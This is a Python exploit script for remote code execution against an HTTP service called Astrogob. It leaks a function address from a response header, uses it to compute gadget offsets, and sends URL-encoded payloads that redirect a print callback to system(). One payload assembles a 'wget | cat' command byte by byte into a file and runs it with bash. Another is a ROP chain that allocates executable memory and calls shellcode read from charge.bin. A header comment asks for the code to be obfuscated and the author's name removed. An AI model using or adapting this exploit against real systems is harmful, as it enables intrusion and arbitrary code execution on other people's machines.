#!/usr/bin/env python
"""
Exploit: Astrogob -> Remote Code Execution (via HTTP)

Note: This must be obfuscated and my name should not appear ðŸ¤ !
                                        Pedro Garcia
"""
import re
from sys import exit as sys_exit, argv as sys_argv
from subprocess import check_output
from urllib.parse import quote
from struct import pack
# pylint: disable=unused-import  # will be used after code generation
from base64 import b64decode

# pylint: disable=global-statement

# Magic
host = "http://localhost:8000"

def main():
    global host
    print("--> Exploit starts")
    if len(sys_argv) >= 2:
        host = 'http://' + sys_argv[1] + ':8000'
    leak()
    exploit3()
    print("<-- Exploit ends")

# Helpers
def cmd(stg):
    print('--> System:', stg)
    return check_output(stg, shell=True, text=True, encoding="latin-1")

def qword(i):
    return quote(pack('<Q', i))

def double(i):
    return quote(pack('d', i))

def mal(arg):
    return cmd('curl -X GET "%s/print_all_points?arg1=' % host + arg + '" 2> /dev/null')

def leak():
    # pylint: disable=global-statement
    global p_astro_print_all_points
    out = cmd('curl -X GET -I "%s/astro_print_all_points"' % host)
    match = re.search(r'Warning: .Calling. (0x[a-fA-F0-9]*)', out)
    p_astro_print_all_points = int(match.group(1), 0x10)
    print("Returned:", out)
    print('Leak: 0x%x' % p_astro_print_all_points)

def p(offset):
    if p_astro_print_all_points == 0:
        print("Error: cannot calculate address <= you forgot to call 'leak'")
        sys_exit(1)
    return qword(offset + p_astro_print_all_points - o_astro_print_all_points)

# Gadgets  # pylint: disable=using-constant-test
if True:
    # This must be leaked
    p_astro_print_all_points = 0

    o_sys = 0x45c0
    o_astro_print_all_points = 0x45a0
    o_str_point = 0x3A80 - 0x20
    o_alloc_rwx = 0x45e0

    # Pivot: mov rsp, rdi; ret
    o_mov_rsp_rdi = 0x45d4

    # Gadget2: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    o_pop_4_x = 0x43a3
    o_nop = o_pop_4_x + 2 * 4

    # Gadget3: push r12 ; push rbp ; push rbx ;
    # cmp esi, 1 ; je 0xb9b0 ; -- cmp esi, 5 ; je 0xba48 ; cmp esi, 7 ; je 0xb9f0 ;
    # pop rbx ; pop rbp ; pop r12 ; ret
    o_push_rbp = 0xb9b4

    # pop rsi ; ret
    o_pop_rsi = 0x3e07

    # pop rcx ; ret
    o_pop_rcx = 0x6478

    # add al, ch ; ret
    o_add_al_ch = 0xb8d7

    # Last: call rax; ret
    # IDK the 0x20
    o_call_rax = 0x3014 - 0x20




def exploit0():
    """ Legitimate point printing """
    return mal(
        double(1.0) +     # Point.x
        double(2.0) +     # Point.y
        p(o_str_point) +  # Point.print
        double(3.0) +     # Point.x
        double(4.0) +     # Point.y
        p(o_str_point) +  # Point.print
        "")

def exploit1():
    """ Echo short msg -> stdout """
    return mal(
        #      0      7
        quote("echo sho") +           # Point.x
        #      0    56       7
        quote("rt msg;") + "%00" +    # Point.y
        p(o_sys) +                    # Point.print
        "")

def exploit2():
    """ Echo long msg -> stdout
    Eastern eggs
    Demo: Must remove the file on disk after execute
    """
    cmd = 'wget -qO- http://example.com/ 2> /dev/null | cat'
    s_sploit = ""
    # Remove (Demo)
    s_sploit += (
        #      0      7
        quote("rm a||: ") +           # Point.x
        #      0123456       7
        quote("       ") + "%00" +    # Point.y
        p(o_sys) +                    # Point.print
        "")
    # Fill
    for c in cmd:
        s_sploit += (
            #      0      7
            quote("echo -n ") +             # Point.x
            #      0 123456           7
            quote("'%c'>>a;" % c) + "%00" + # Point.y
            p(o_sys) +                      # Point.print
            "")
    # Execute
    s_sploit += (
        #      0      7
        quote("bash a; ") +           # Point.x
        #      0123456       7
        quote("       ") + "%00" +    # Point.y
        p(o_sys) +                    # Point.print
        "")
    # # Remove: Demo Commented for demo purposes
    # s_sploit += (
    #     #      0      7
    #     quote("rm a;   ") +           # Point.x
    #     #      0123456       7
    #     quote("       ") + "%00" +   # Point.y
    #     p(o_sys) +                    # Point.print
    #     "")
    return mal(s_sploit)


def exploit3():
    """ Small ROP-chain
    """

    b_charge = open('./charge.bin', 'rb').read()
    i_lenght = 0xff + len(b_charge)
    return mal(
        p(o_pop_4_x) +      # 00 1/ret  Point.x Gadget 3
        qword(0x8) +        # 08 2/pop
        p(o_mov_rsp_rdi) +  # 10 1/call pivot   Gadget 1; pop
        qword(0x18) +       # 18 2/pop
        qword(0x20) +       # 20 2/pop
        p(o_push_rbp) +     # 28 2/ret        Gadget 3: Save stack for back pivot
        p(o_pop_rsi) +      # 70 ret          Gadget 4
        qword(i_lenght) +   # 78 pop rsi
        p(o_alloc_rwx) +    # 80 ret          Gadget 5
        p(o_pop_rcx) +      # 88 ret          Gadget 6.1  <6 push rbx
        qword(2**64-1) +    # 90 pop rcx                  <6 push rbp
        p(o_add_al_ch) +    # 98 ret          Gadget 6.2  <6 push r12
        p(o_call_rax) +     # a8 ret          Gadget 99
        p(o_nop) +          # a0
        p(o_nop) +          # 30
        p(o_nop) +          # 38
        p(o_nop) +          # 40
        p(o_nop) +          # 48
        p(o_nop) +          # 50
        p(o_nop) +          # 58
        p(o_nop) +          # 60
        p(o_nop) +          # 68
        qword(0xb0) +       # b0
        qword(0xb8) +       # b8
        qword(0xc0) +       # c0
        qword(0xc8) +       # c8
        qword(0xd0) +       # d0
        qword(0xd8) +       # d8
        qword(0xe0) +       # e0
        qword(0xe8) +       # e8
        qword(0xf0) +       # f0
        #      0     6
        quote("       ") +  # f8..ff
        quote(b_charge) +
        "")

if __name__ == '__main__':
    sys_exit(main())
